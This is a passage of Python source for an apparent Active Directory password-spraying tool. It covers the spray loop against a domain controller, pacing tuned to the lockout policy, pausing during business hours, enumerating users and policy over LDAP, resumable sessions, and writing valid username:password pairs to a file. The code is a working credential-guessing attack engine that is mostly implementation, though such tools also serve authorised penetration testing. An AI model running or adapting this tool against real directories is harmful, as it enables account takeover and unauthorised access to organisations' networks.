                current_time = self.time_verifier.get_current_time(self.session.schedule.timezone)
                is_business, should_pause = self.session.schedule.get_current_status_with_time(current_time)
                if should_pause:
                    schedule_str = f" | {Colors.RED}PAUSED (schedule){Colors.NC}"
                elif is_business:
                    schedule_str = f" | {Colors.ORANGE}Business hours{Colors.NC}"

            # Build status line
            if extra:
                status = f" {Colors.LBLUE}[{extra}]{Colors.NC} | {eta_str}{schedule_str}"
            elif password:
                status = f" {Colors.LBLUE}Password:{Colors.NC} {password} | {eta_str}{schedule_str}"
            else:
                status = f" {eta_str}{schedule_str}"

            # Save cursor, move to bottom line, clear it, print status, restore cursor
            # Using portable escape sequences
            sys.stderr.write("\033[s")  # Save cursor position
            sys.stderr.write(f"\033[{self._terminal_rows};1H")  # Move to bottom line
            sys.stderr.write("\033[2K")  # Clear line
            sys.stderr.write(f"{Colors.ORANGE}{status}{Colors.NC}")
            sys.stderr.write("\033[u")  # Restore cursor position
            sys.stderr.flush()
        except Exception:
            pass  # Best effort - don't crash on status bar issues

    def _calculate_eta_string(self) -> str:
        """Calculate and format the ETA string."""
        if not self._start_time or self._total_passwords == 0:
            return "ETA: calculating..."

        passwords_remaining = self._total_passwords - self._current_password_num
        if passwords_remaining <= 0:
            return "ETA: completing..."

        safe_attempts = self.session.get_safe_attempts_per_window(apply_schedule=False)  # Base attempts for ETA
        sleep_time = self.session.get_sleep_time_seconds()

        # Calculate remaining sleep cycles
        if safe_attempts >= 100 or sleep_time == 0:
            # No lockout policy - estimate based on elapsed time
            elapsed = (datetime.now() - self._start_time).total_seconds()
            if self._current_password_num > 0:
                time_per_password = elapsed / self._current_password_num
                remaining_seconds = int(passwords_remaining * time_per_password)
            else:
                return "ETA: calculating..."
        else:
            # Calculate based on sleep cycles
            remaining_sleeps = passwords_remaining // safe_attempts
            remaining_seconds = remaining_sleeps * sleep_time

            # Add estimate for actual spray time (rough: 1 sec per user per password)
            users_active = len(self.session.users) - len(self.session.skipped_users)
            remaining_seconds += passwords_remaining * users_active * 1

        # Format the ETA
        eta_time = datetime.now() + timedelta(seconds=remaining_seconds)

        if remaining_seconds < 60:
            time_str = f"{remaining_seconds}s"
        elif remaining_seconds < 3600:
            time_str = f"{remaining_seconds // 60}m {remaining_seconds % 60}s"
        else:
            hours = remaining_seconds // 3600
            mins = (remaining_seconds % 3600) // 60
            time_str = f"{hours}h {mins}m"

        return f"ETA: {eta_time.strftime('%H:%M:%S')} ({time_str} remaining) | {self._current_password_num}/{self._total_passwords} passwords"

    def _handle_interrupt(self, signum, frame):
        """
        Handle Ctrl+C signal - sets flag for main loop to check.
        
        Does NOT call input() here to avoid deadlocks. Instead, sets
        _pause_requested flag which is checked in _check_pause().
        """
        if self._pause_requested or self.paused:
            # Second Ctrl+C - stop immediately
            self.stopped = True
            self.paused = False
            self._pause_requested = False
        else:
            # First Ctrl+C - request pause
            self._pause_requested = True

    def _check_pause(self):
        """
        Check if pause was requested and handle it.
        
        Call this from the main loop to safely handle pause requests.
        This is where we can safely call input() since we're in the main thread.
        """
        if not self._pause_requested:
            return

        self._pause_requested = False
        self.paused = True

        self._print(f"\n{Colors.ORANGE}[+] Spray paused.{Colors.NC}", level=1)
        self._print(f"{Colors.ORANGE}[+] Press{Colors.NC} Ctrl+C {Colors.ORANGE}again to quit.{Colors.NC}", level=1)
        self._print(f"{Colors.ORANGE}[+] Press{Colors.NC} Enter {Colors.ORANGE}to continue.{Colors.NC}", level=1)

        if self._is_tty:
            try:
                input()
                self.paused = False
                self._print(f"{Colors.ORANGE}[+] Spray resumed.{Colors.NC}", level=1)
            except EOFError:
                self.stopped = True
        else:
            # Non-TTY: treat pause request as stop
            self.stopped = True

    def _print(self, message: str, level: int = 3, end: str = "\n"):
        """Print message if verbosity level is high enough."""
        if self.verbose >= level:
            print(message, end=end, file=sys.stderr, flush=True)

    def _save_session(self):
        """Save current session state."""
        self.session.save(self.session_path)

    def _write_success(self, username: str, password: str, status: str):
        """Write successful credential to output file."""
        output_file = self.session.config.output_file
        if not output_file:
            return

        suffix = "" if status == ERROR_SUCCESS else f" # {status.replace('ERROR_', '')}"

        with open(output_file, "a") as f:
            f.write(f"{username}:{password}{suffix}\n")

    def _check_credential(self, username: str, password: str) -> str:
        """Check a single credential against AD. Returns the error code."""
        config = self.session.config
        result = check_auth(
            dc_host=config.dc_host,
            username=username,
            password=password,
            workgroup=config.workgroup,
            use_ssl=config.use_ssl,
            port=config.port,
        )
        return result["status"]

    def _wait_for_business_hours_end(self):
        """Wait until business hours end if currently in business hours with reduced attempts <= 0."""
        if not self.session.schedule.is_enabled():
            return

        while not self.stopped:
            # Use verified time for schedule checks
            safe_attempts = self.session.get_safe_attempts_per_window(
                apply_schedule=True, 
                time_verifier=self.time_verifier
            )
            
            if safe_attempts > 0:
                # Can proceed with reduced attempts
                return
            
            current_time = self.time_verifier.get_current_time(self.session.schedule.timezone)
            is_business, should_pause = self.session.schedule.get_current_status_with_time(current_time)
            
            if not is_business and not should_pause:
                # Outside business hours, can proceed
                return
            
            # Need to wait
            wait_time = self.session.schedule.get_time_until_business_hours_end_with_time(current_time)
            if wait_time is None or wait_time <= 0:
                return
            
            # Cap wait time and show status
            wait_chunk = min(wait_time, 60)  # Check every minute
            hours = wait_time // 3600
            mins = (wait_time % 3600) // 60
            
            self._print(
                f"{Colors.ORANGE}[+] Pausing during business hours. "
                f"Resuming in ~{hours}h {mins}m...{Colors.NC}",
                level=1
            )
            self._update_status_bar(extra=f"Paused (business hours) - {hours}h {mins}m remaining")
            
            # Sleep in chunks to respond to interrupts
            remaining = wait_chunk
            while remaining > 0 and not self.stopped:
                self._check_pause()
                if self.stopped:
                    return
                chunk = min(remaining, 1)
                time.sleep(chunk)
                remaining -= chunk

    def run(self) -> bool:
        """Execute the spray. Returns True if completed successfully."""
        config = self.session.config
        policy = self.session.policy

        # Display time verification status
        self._print(f"{Colors.ORANGE}[+] Time Verification{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]     Time Source:{Colors.NC} {self.time_verifier.source}", level=1)
        
        if self.session.schedule.is_enabled():
            current_time = self.time_verifier.get_current_time(self.session.schedule.timezone)
            self._print(f"{Colors.BLUE}[+]   Current Time:{Colors.NC} {current_time.strftime('%Y-%m-%d %H:%M:%S %Z')}", level=1)
        else:
            current_time = self.time_verifier.get_current_time()
            self._print(f"{Colors.BLUE}[+]   Current Time:{Colors.NC} {current_time.strftime('%Y-%m-%d %H:%M:%S')} UTC", level=1)
        
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)

        # Display schedule information if enabled
        if self.session.schedule.is_enabled():
            self._print(f"{Colors.ORANGE}[+] Business Hours Schedule{Colors.NC}", level=1)
            schedule_display = format_schedule_display(self.session.schedule, self.time_verifier)
            for line in schedule_display.split('\n'):
                self._print(f"{Colors.BLUE}[+]{Colors.NC}{line}", level=1)
            self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)

        safe_attempts = self.session.get_safe_attempts_per_window(apply_schedule=False)  # Base for display
        sleep_time = self.session.get_sleep_time_seconds()

        # Check if spraying is even possible with this lockout policy
        if safe_attempts <= 0:
            self._print(
                f"{Colors.RED}[!] Cannot spray safely: lockout threshold is {policy.lockout_threshold}{Colors.NC}",
                level=1
            )
            self._print(
                f"{Colors.RED}[!] Any failed attempt would lock accounts. Aborting.{Colors.NC}",
                level=1
            )
            return False

        # Filter passwords that don't meet policy (length + complexity categories)
        # Note: username-in-password check is done per-user during spraying
        valid_passwords = []
        for pwd in self.session.passwords:
            if pwd in self.session.skipped_passwords:
                continue
            meets, reason = self.session.password_meets_policy(pwd)  # No username here
            if not meets:
                self._print(
                    f"{Colors.ORANGE}[!] Skipping password '{pwd}' - {reason}{Colors.NC}",
                    level=2
                )
                self.session.skipped_passwords.add(pwd)
                continue
            valid_passwords.append(pwd)

        total_users = len(self.session.users) - len(self.session.skipped_users)
        total_passwords = len(valid_passwords)
        total_attempts = total_users * total_passwords

        # Print configuration
        self._print(f"{Colors.ORANGE}[+] Spray Configuration{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]         Session:{Colors.NC} {config.session_id}", level=1)
        self._print(f"{Colors.BLUE}[+]         DC Host:{Colors.NC} {config.dc_host}", level=1)
        self._print(f"{Colors.BLUE}[+]       Workgroup:{Colors.NC} {config.workgroup}", level=1)
        self._print(f"{Colors.BLUE}[+]    User as Pass:{Colors.NC} {config.user_as_pass}", level=1)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]   Lockout Policy{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]       Threshold:{Colors.NC} {policy.lockout_threshold} attempts", level=1)
        self._print(f"{Colors.BLUE}[+]      Obs Window:{Colors.NC} {policy.lockout_observation_window_minutes} min", level=1)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]  Password Policy{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]    Min Pwd Len:{Colors.NC} {policy.min_password_length}", level=1)
        self._print(f"{Colors.BLUE}[+]    Complexity:{Colors.NC} {'Enabled' if policy.complexity_enabled else 'Disabled'}", level=1)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]   Spray Strategy{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]  Safe attempts:{Colors.NC} {safe_attempts} per window", level=1)
        if self.session.schedule.is_enabled():
            reduced = self.session.schedule.get_reduced_attempts(policy.lockout_threshold)
            self._print(f"{Colors.BLUE}[+]  Business hrs:{Colors.NC} {reduced} per window (reduction: {self.session.schedule.business_hours_reduction})", level=1)
        if sleep_time > 0:
            self._print(f"{Colors.BLUE}[+]     Sleep time:{Colors.NC} {sleep_time // 60} min", level=1)
        else:
            self._print(f"{Colors.BLUE}[+]     Sleep time:{Colors.NC} None (no lockout)", level=1)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]          Users:{Colors.NC} {len(self.session.users)} ({total_users} active)", level=1)
        self._print(f"{Colors.BLUE}[+]      Passwords:{Colors.NC} {len(self.session.passwords)} ({total_passwords} valid)", level=1)
        self._print(f"{Colors.BLUE}[+]  Est. Attempts:{Colors.NC} {total_attempts}", level=1)

        if sleep_time > 0 and total_passwords > safe_attempts:
            num_sleeps = (total_passwords - 1) // safe_attempts
            eta_seconds = num_sleeps * sleep_time
            eta = datetime.now() + timedelta(seconds=eta_seconds)
            self._print(f"{Colors.BLUE}[+]            ETA:{Colors.NC} {eta.strftime('%Y-%m-%d %H:%M')}", level=1)

        self._print("", level=1)

        if self.verbose >= 1 and self._is_tty:
            try:
                input("(Press Enter to start the spray)")
            except EOFError:
                pass
            self._print("", level=1)

        self._print(f"{Colors.ORANGE}[+] Starting password spray...{Colors.NC}", level=2)

        # Initialize status bar tracking
        self._start_time = datetime.now()
        self._total_passwords = len(valid_passwords) + (1 if config.user_as_pass else 0)
        self._current_password_num = 0
        self._setup_status_bar()

        try:
            # Handle user-as-password first if enabled
            if config.user_as_pass and self.session.current_password_index == 0:
                # Check business hours before starting
                self._wait_for_business_hours_end()
                if self.stopped:
                    self._save_session()
                    return False

                self._current_password_num = 1
                self._update_status_bar(password="<username>")
                self._print(f"{Colors.ORANGE}[+] Trying username as password...{Colors.NC}", level=2)
                for username in self.session.users:
                    self._check_pause()  # Check for pause request
                    if self.stopped:
                        break
                    if username in self.session.skipped_users:
                        continue
                    meets, reason = self.session.password_meets_policy(username, username)
                    if not meets:
                        self._print(
                            f"{Colors.ORANGE}[!] Skipping user '{username}' as password - {reason}{Colors.NC}",
                            level=3
                        )
                        continue

                    self._spray_single(username, username)

                if not self.stopped:
                    self.session.attempts_since_sleep += 1
                    if self._should_sleep():
                        self._update_status_bar(extra=f"Sleeping {sleep_time // 60}m")
                        self._do_sleep(sleep_time)

            # Main password loop
            passwords_to_try = valid_passwords[self.session.current_password_index:]

            for pwd_idx, password in enumerate(passwords_to_try, start=self.session.current_password_index):
                self._check_pause()  # Check for pause request
                if self.stopped:
                    self._print(f"\n{Colors.RED}[+] Spray stopped by user.{Colors.NC}", level=1)
                    self._save_session()
                    return False

                # Check business hours before each password
                self._wait_for_business_hours_end()
                if self.stopped:
                    self._save_session()
                    return False

                # Update progress tracking
                self._current_password_num = pwd_idx + 1 + (1 if config.user_as_pass else 0)
                self._update_status_bar(password=password)

                self._print(f"{Colors.ORANGE}[+] Spraying password:{Colors.NC} {password}", level=2)

                for username in self.session.users:
                    self._check_pause()  # Check for pause request
                    if self.stopped:
                        break
                    if username in self.session.skipped_users:
                        continue

                    # Skip if password contains this username (complexity rule)
                    if self.session.password_contains_username(password, username):
                        self._print(
                            f"{Colors.ORANGE}[!] Skipping {username}:{password} - "
                            f"password contains username{Colors.NC}",
                            level=3
                        )
                        continue

                    self._spray_single(username, password)

                self.session.current_password_index = pwd_idx + 1
                self.session.attempts_since_sleep += 1

                # Check if we need to sleep (using current schedule-adjusted attempts)
                if self._should_sleep() and pwd_idx < len(valid_passwords) - 1:
                    self._update_status_bar(extra=f"Sleeping {sleep_time // 60}m")
                    self._do_sleep(sleep_time)

                # Periodic save
                self._save_session()

            # Mark completed
            self.session.config.completed = True
            self._save_session()

        finally:
            self._cleanup_status_bar()

        self._print(f"\n{Colors.GREEN}[+] Spray completed successfully.{Colors.NC}", level=1)
        stats = self.session.get_stats()
        self._print(f"{Colors.GREEN}[+] Valid credentials:{Colors.NC} {stats.get(ERROR_SUCCESS, 0)}", level=1)
        self._print(f"{Colors.GREEN}[+] Disabled accounts:{Colors.NC} {stats.get(ERROR_ACCOUNT_DISABLED, 0)}", level=1)
        self._print(f"{Colors.GREEN}[+] Locked accounts:{Colors.NC} {stats.get(ERROR_ACCOUNT_LOCKED_OUT, 0)}", level=1)

        return True

    def _should_sleep(self) -> bool:
        """Check if we should sleep before the next password."""
        # Get current safe attempts (schedule-aware with verified time)
        safe_attempts = self.session.get_safe_attempts_per_window(
            apply_schedule=True,
            time_verifier=self.time_verifier
        )
        if safe_attempts >= 100:  # No lockout policy
            return False
        if safe_attempts <= 0:  # Should be paused entirely (handled elsewhere)
            return False
        return self.session.attempts_since_sleep >= safe_attempts

    def _do_sleep(self, sleep_time: int):
        """Sleep between password batches."""
        self.session.attempts_since_sleep = 0
        if sleep_time <= 0:
            return

        self._print(
            f"{Colors.ORANGE}[+] Sleeping for {sleep_time // 60} minutes to avoid lockouts...{Colors.NC}",
            level=1
        )
        self._save_session()

        # Sleep in chunks so we can respond to interrupts and update status
        remaining = sleep_time
        while remaining > 0 and not self.stopped:
            self._check_pause()  # Check for pause request
            if self.stopped:
                break
            mins = remaining // 60
            secs = remaining % 60
            self._update_status_bar(extra=f"Sleeping {mins}m {secs}s")
            chunk = min(remaining, 1)
            time.sleep(chunk)
            remaining -= chunk

        if not self.stopped:
            self._print(f"{Colors.ORANGE}[+] Resuming spray...{Colors.NC}", level=1)

    def _spray_single(self, username: str, password: str):
        """Spray a single credential."""
        self._print(
            f"{Colors.BLUE}[+] Trying:{Colors.NC} {username}:{password} {Colors.BLUE}...{Colors.NC}",
            level=3, end=""
        )

        status = self._check_credential(username, password)

        # Record the attempt
        attempt = Attempt(
            username=username,
            password=password,
            status=status,
            timestamp=datetime.now().isoformat(),
        )
        self.session.attempts.append(attempt)

        # Handle result based on Microsoft error codes
        if status == ERROR_SUCCESS:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.GREEN}VALID{Colors.NC}", level=1)
            self._write_success(username, password, status)

        elif status == ERROR_ACCOUNT_DISABLED:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.GREEN}VALID{Colors.NC} but {Colors.RED}DISABLED{Colors.NC}", level=1)
            self._write_success(username, password, status)

        elif status == ERROR_PASSWORD_MUST_CHANGE:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.GREEN}VALID{Colors.NC} but {Colors.ORANGE}MUST_CHANGE{Colors.NC}", level=1)
            self._write_success(username, password, status)

        elif status == ERROR_PASSWORD_EXPIRED:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.GREEN}VALID{Colors.NC} but {Colors.ORANGE}PWD_EXPIRED{Colors.NC}", level=1)
            self._write_success(username, password, status)

        elif status == ERROR_ACCOUNT_LOCKED_OUT:
            self.session.skipped_users.add(username)
            self.consecutive_lockouts += 1
            self._print(f" {Colors.RED}LOCKED_OUT{Colors.NC}", level=1)

            if self.consecutive_lockouts >= 3:
                self._print(
                    f"{Colors.RED}[!] 3+ consecutive lockouts detected! This shouldn't happen.{Colors.NC}",
                    level=1
                )
                self._print(
                    f"{Colors.RED}[!] Check lockout policy settings. Pausing...{Colors.NC}",
                    level=1
                )
                self.paused = True
                self._handle_interrupt(None, None)

        elif status == ERROR_ACCOUNT_EXPIRED:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.RED}ACCOUNT_EXPIRED{Colors.NC}", level=1)

        elif status == ERROR_NO_SUCH_USER:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.RED}NO_SUCH_USER{Colors.NC}", level=2)

        elif status in (ERROR_HOST_UNREACHABLE, ERROR_GEN_FAILURE):
            self._print(f" {Colors.RED}ERROR: {status}{Colors.NC}", level=1)

        else:  # ERROR_LOGON_FAILURE or other
            self.consecutive_lockouts = 0
            self._print(f" {Colors.RED}INVALID{Colors.NC}", level=3)


# ---------------------------------------------------------------------------
# Session Management
# ---------------------------------------------------------------------------

def generate_session_id() -> str:
    """Generate a unique session ID."""
    data = f"{time.time()}-{os.getpid()}"
    return hashlib.md5(data.encode()).hexdigest()


def fetch_domain_info(
    dc_host: str,
    username: str,
    password: str,
    workgroup: str,
    use_ssl: bool = False,
    port: Optional[int] = None,
    base_dn: Optional[str] = None,
    verbose: int = 3,
) -> tuple:
    """
    Connect to AD and fetch users and policy.
    Returns (users, policy) tuple.
    """
    def _print(msg: str, level: int = 3):
        if verbose >= level:
            print(msg, file=sys.stderr)

    _print(f"{Colors.BLUE}[+] Connecting to {dc_host}...{Colors.NC}", level=1)

    with ADConnection(
        dc_host=dc_host,
        username=username,
        password=password,
        workgroup=workgroup,
        base_dn=base_dn,
        use_ssl=use_ssl,
        port=port,
    ) as ad:
        _print(f"{Colors.BLUE}[+] Connected. Base DN: {ad.base_dn}{Colors.NC}", level=2)

        # Fetch users
        _print(f"{Colors.BLUE}[+] Enumerating users...{Colors.NC}", level=1)
        users = ad.get_users()
        _print(f"{Colors.GREEN}[+] Found {len(users)} users{Colors.NC}", level=1)

        # Fetch lockout policy
        _print(f"{Colors.BLUE}[+] Fetching lockout policy...{Colors.NC}", level=1)
        policy_dict = ad.get_lockout_policy()
        policy = PasswordPolicy.from_dict(policy_dict)

        _print(f"{Colors.GREEN}[+] Lockout threshold: {policy.lockout_threshold}{Colors.NC}", level=1)
        _print(f"{Colors.GREEN}[+] Observation window: {policy.lockout_observation_window_minutes} min{Colors.NC}", level=1)
        _print(f"{Colors.GREEN}[+] Min password length: {policy.min_password_length}{Colors.NC}", level=1)
        _print(f"{Colors.GREEN}[+] Complexity required: {policy.complexity_enabled}{Colors.NC}", level=1)

        return users, policy


def fetch_policy_only(
    dc_host: str,
    username: str,
    password: str,
    workgroup: str,
    use_ssl: bool = False,
    port: Optional[int] = None,
    base_dn: Optional[str] = None,
    verbose: int = 3,
) -> PasswordPolicy:
    """
    Connect to AD and fetch only the policy.
    Returns PasswordPolicy.
    """
    def _print(msg: str, level: int = 3):
        if verbose >= level:
            print(msg, file=sys.stderr)

    _print(f"{Colors.BLUE}[+] Connecting to {dc_host} for policy...{Colors.NC}", level=1)

    with ADConnection(
        dc_host=dc_host,
        username=username,
        password=password,
        workgroup=workgroup,
        base_dn=base_dn,
        use_ssl=use_ssl,
        port=port,
    ) as ad:
        _print(f"{Colors.BLUE}[+] Fetching lockout policy...{Colors.NC}", level=1)
        policy_dict = ad.get_lockout_policy()
        policy = PasswordPolicy.from_dict(policy_dict)

        _print(f"{Colors.GREEN}[+] Lockout threshold: {policy.lockout_threshold}{Colors.NC}", level=1)
        _print(f"{Colors.GREEN}[+] Observation window: {policy.lockout_observation_window_minutes} min{Colors.NC}", level=1)
        _print(f"{Colors.GREEN}[+] Min password length: {policy.min_password_length}{Colors.NC}", level=1)
        _print(f"{Colors.GREEN}[+] Complexity required: {policy.complexity_enabled}{Colors.NC}", level=1)

        return policy


def create_session(
    dc_host: str,
    workgroup: str,
    users: List[str],
    passwords: List[str],
    policy: PasswordPolicy,
    schedule: Schedule,
    user_as_pass: bool = False,
    use_ssl: bool = False,
    port: Optional[int] = None,
    output_file: Optional[str] = None,
    verbose: int = 3,
) -> SpraySession:
    """Create a new spray session."""
    session_id = generate_session_id()

    config = SprayConfig(
        session_id=session_id,
        dc_host=dc_host,
        workgroup=workgroup,
        use_ssl=use_ssl,
        port=port,
        output_file=output_file,
        verbose=verbose,
        user_as_pass=user_as_pass,
        created_at=datetime.now().isoformat(),
    )

    return SpraySession(
        config=config,
        policy=policy,
        schedule=schedule,
        users=users,
        passwords=passwords,
    )


def list_sessions(session_path: Path) -> List[Dict[str, Any]]:
    """List all available sessions."""
    sessions = []
    if not session_path.exists():
        return sessions

    for session_dir in session_path.iterdir():
        if not session_dir.is_dir():
            continue
        try:
            session = SpraySession.load(session_path, session_dir.name)
            stats = session.get_stats()
            sessions.append({
                "session_id": session.config.session_id,
                "workgroup": session.config.workgroup,
                "dc_host": session.config.dc_host,
                "completed": session.config.completed,
                "created_at": session.config.created_at,
                "total": len(session.attempts),
                "valid": stats.get(ERROR_SUCCESS, 0),
                "disabled": stats.get(ERROR_ACCOUNT_DISABLED, 0),
            })
        except Exception:
            continue

    return sorted(sessions, key=lambda x: x["created_at"], reverse=True)


# ---------------------------------------------------------------------------
# CLI Commands
# ---------------------------------------------------------------------------

def cmd_spray(args) -> int:
    """Execute a new spray or resume an existing one."""
    session_path = Path(args.session_path)

    # Load config file if specified
    config_values = {}
    if hasattr(args, 'config') and args.config:
        try:
            config_values = load_config(args.config)
            print(f"{Colors.GREEN}[+] Loaded config from: {args.config}{Colors.NC}", file=sys.stderr)
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to load config: {e}{Colors.NC}", file=sys.stderr)
            return 1

    # Merge config with CLI args (CLI takes precedence)
    # Set defaults for args that might not exist
    for key in ['dc', 'workgroup', 'username', 'password', 'ssl', 'port', 'base_dn',
                'spray_passwords', 'users_file', 'output', 'userpass', 'verbose',
                'lockout_threshold', 'lockout_window', 'min_length', 'complexity',
                'timezone', 'business_hours_reduction', 'daily_hours']:
        if not hasattr(args, key):
            setattr(args, key, None)

    # Apply config values where CLI didn't override
    for key, value in config_values.items():
        if value is not None:
            arg_key = key
            # Handle key name differences
            if key == 'passwords_file':
                arg_key = 'spray_passwords'
            
            current = getattr(args, arg_key, None)
            # Only apply config if CLI arg wasn't provided
            # For booleans, we need special handling since False is a valid value
            if current is None or (isinstance(current, bool) and not current and value):
                setattr(args, arg_key, value)

    if args.resume:
        # Resume existing session
        try:
            session = SpraySession.load(session_path, args.resume)
            if session.config.completed:
                print(f"{Colors.ORANGE}[!] Session already completed.{Colors.NC}", file=sys.stderr)
                return 1
            print(f"{Colors.GREEN}[+] Resuming session: {args.resume}{Colors.NC}", file=sys.stderr)
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Session not found: {args.resume}{Colors.NC}", file=sys.stderr)
            return 1
    else:
        # Validate required args
        if not args.dc:
            print(f"{Colors.RED}[!] Domain controller is required (-d){Colors.NC}", file=sys.stderr)
            return 1
        if not args.workgroup:
            print(f"{Colors.RED}[!] Workgroup is required (-w){Colors.NC}", file=sys.stderr)
            return 1
        if not args.spray_passwords:
            print(f"{Colors.RED}[!] Passwords file is required (--passwords){Colors.NC}", file=sys.stderr)
            return 1

        have_creds = args.username and args.password

        # Check for 'auto' settings that require creds
        # Collect all auto settings for clear error messaging
        auto_settings = []
        
        # Check users_file
        users_auto = args.users_file and str(args.users_file).lower() == 'auto'
        if users_auto:
            auto_settings.append('users_file')
        
        # Check policy settings
        if args.lockout_threshold == 'auto':
            auto_settings.append('lockout_threshold')
        if args.lockout_window == 'auto':
            auto_settings.append('lockout_window')
        if args.min_length == 'auto':
            auto_settings.append('min_length')
        if args.complexity == 'auto':
            auto_settings.append('complexity')

        if auto_settings and not have_creds:
            print(f"{Colors.RED}[!] AD credentials (-u/-p) required for 'auto' settings{Colors.NC}", file=sys.stderr)
            print(f"{Colors.RED}[!] The following are set to 'auto': {', '.join(auto_settings)}{Colors.NC}", file=sys.stderr)
            return 1

        # If no users file specified and no creds, that's an error
        if not args.users_file and not have_creds:
            print(f"{Colors.RED}[!] Either provide a users file (--users) or AD credentials (-u/-p) for auto-enumeration{Colors.NC}", file=sys.stderr)
            return 1

        # Load passwords to spray
        try:
            with open(args.spray_passwords) as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Passwords file not found: {args.spray_passwords}{Colors.NC}", file=sys.stderr)
            return 1

        if not passwords:
            print(f"{Colors.RED}[!] Passwords file is empty{Colors.NC}", file=sys.stderr)
            return 1

        # Build schedule
        schedule = Schedule.disabled()
        if args.timezone:
            try:
                # Validate timezone
                ZoneInfo(args.timezone)
                daily_hours = args.daily_hours if args.daily_hours else {}
                # Ensure all days have entries
                for day in DAYS_OF_WEEK:
                    if day not in daily_hours:
                        daily_hours[day] = BusinessHoursWindow(start=None, end=None, pause_all_day=False)
                schedule = Schedule(
                    timezone=args.timezone,
                    business_hours_reduction=args.business_hours_reduction or 3,
                    daily_hours=daily_hours,
                )
            except Exception as e:
                print(f"{Colors.RED}[!] Invalid timezone: {args.timezone}: {e}{Colors.NC}", file=sys.stderr)
                return 1

        # Get users and policy
        if have_creds:
            # Fetch from AD as needed
            try:
                # Enumerate users from AD if users_file is 'auto' or not specified
                should_enumerate_users = users_auto or not args.users_file
                if should_enumerate_users:
                    # Enumerate users from AD
                    print(f"{Colors.BLUE}[+] Enumerating users from AD (auto)...{Colors.NC}", file=sys.stderr)
                    users, ad_policy = fetch_domain_info(
                        dc_host=args.dc,
                        username=args.username,
                        password=args.password,
                        workgroup=args.workgroup,
                        use_ssl=args.ssl or False,
                        port=args.port,
                        base_dn=args.base_dn,
                        verbose=args.verbose or 3,
                    )
                else:
                    # Use provided users file
                    try:
                        with open(args.users_file) as f:
                            users = [line.strip() for line in f if line.strip()]
                    except FileNotFoundError:
                        print(f"{Colors.RED}[!] Users file not found: {args.users_file}{Colors.NC}", file=sys.stderr)
                        return 1
                    print(f"{Colors.GREEN}[+] Loaded {len(users)} users from file{Colors.NC}", file=sys.stderr)

                    # Check if any policy setting needs to be fetched from AD
                    policy_auto = (
                        args.lockout_threshold == 'auto' or
                        args.lockout_window == 'auto' or
                        args.min_length == 'auto' or
                        args.complexity == 'auto'
                    )
                    if policy_auto:
                        # Fetch policy from AD
                        ad_policy = fetch_policy_only(
                            dc_host=args.dc,
                            username=args.username,
                            password=args.password,
                            workgroup=args.workgroup,
                            use_ssl=args.ssl or False,
                            port=args.port,
                            base_dn=args.base_dn,
                            verbose=args.verbose or 3,
                        )
                    else:
                        ad_policy = None

                # Build final policy (mix of auto and manual)
                policy = PasswordPolicy(
                    lockout_threshold=(
                        ad_policy.lockout_threshold if args.lockout_threshold == 'auto' and ad_policy
                        else (args.lockout_threshold if isinstance(args.lockout_threshold, int) else 5)
                    ),
                    lockout_duration_minutes=30,
                    lockout_observation_window_minutes=(
                        ad_policy.lockout_observation_window_minutes if args.lockout_window == 'auto' and ad_policy
                        else (args.lockout_window if isinstance(args.lockout_window, int) else 30)
                    ),
                    min_password_length=(
                        ad_policy.min_password_length if args.min_length == 'auto' and ad_policy
                        else (args.min_length if isinstance(args.min_length, int) else 0)
                    ),
                    password_history_length=0,
                    complexity_enabled=(
                        ad_policy.complexity_enabled if args.complexity == 'auto' and ad_policy
                        else (args.complexity if isinstance(args.complexity, bool) else False)
                    ),
                )

            except Exception as e:
                print(f"{Colors.RED}[!] Failed to connect to AD: {e}{Colors.NC}", file=sys.stderr)
                return 1
        else:
            # No creds - use users file and manual policy (already validated no 'auto' above)
            try:
                with open(args.users_file) as f:
                    users = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"{Colors.RED}[!] Users file not found: {args.users_file}{Colors.NC}", file=sys.stderr)
                return 1

            print(f"{Colors.GREEN}[+] Loaded {len(users)} users from file{Colors.NC}", file=sys.stderr)
            print(f"{Colors.ORANGE}[+] No AD creds - using manual policy settings{Colors.NC}", file=sys.stderr)

            policy = PasswordPolicy(
                lockout_threshold=args.lockout_threshold if isinstance(args.lockout_threshold, int) else 5,
                lockout_duration_minutes=args.lockout_window if isinstance(args.lockout_window, int) else 30,
                lockout_observation_window_minutes=args.lockout_window if isinstance(args.lockout_window, int) else 30,
                min_password_length=args.min_length if isinstance(args.min_length, int) else 0,
                password_history_length=0,
                complexity_enabled=args.complexity if isinstance(args.complexity, bool) else False,
            )

            print(f"{Colors.BLUE}[+]   Lockout: {policy.lockout_threshold} / {policy.lockout_observation_window_minutes}min{Colors.NC}", file=sys.stderr)
            print(f"{Colors.BLUE}[+]   Min length: {policy.min_password_length}{Colors.NC}", file=sys.stderr)
            print(f"{Colors.BLUE}[+]   Complexity: {policy.complexity_enabled}{Colors.NC}", file=sys.stderr)

        if not users:
            print(f"{Colors.RED}[!] No users found{Colors.NC}", file=sys.stderr)
            return 1

